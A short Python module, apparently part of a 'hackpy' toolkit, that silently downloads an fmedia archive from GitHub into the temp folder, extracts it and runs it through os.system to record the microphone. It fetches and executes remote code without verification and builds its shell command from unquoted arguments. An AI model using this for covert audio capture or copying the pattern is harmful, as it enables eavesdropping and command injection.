
# Import modules
import os
import urllib.request
from zipfile import ZipFile

__fmediaPATH = os.path.join(os.getenv("temp"), "fmedia")
__fmediaLINK = "https://raw.githubusercontent.com/LimerBoy/hackpy/master/modules/audio.zip"

""" Record audio from microphone """
def Record(filename, time):
    
    # Check if fmedia exists
    if not os.path.exists(__fmediaPATH):
        __fmediaARCHIVE = __fmediaPATH + ".zip"
        urllib.request.urlretrieve(__fmediaLINK, __fmediaARCHIVE)
        with ZipFile(__fmediaARCHIVE, 'r') as archive:
            archive.extractall(__fmediaPATH)
        os.remove(__fmediaARCHIVE)

    # Record microphone
    command = f"@{__fmediaPATH}\\fmedia.exe --record --until={time} -o {filename} > NUL"
    os.system(command)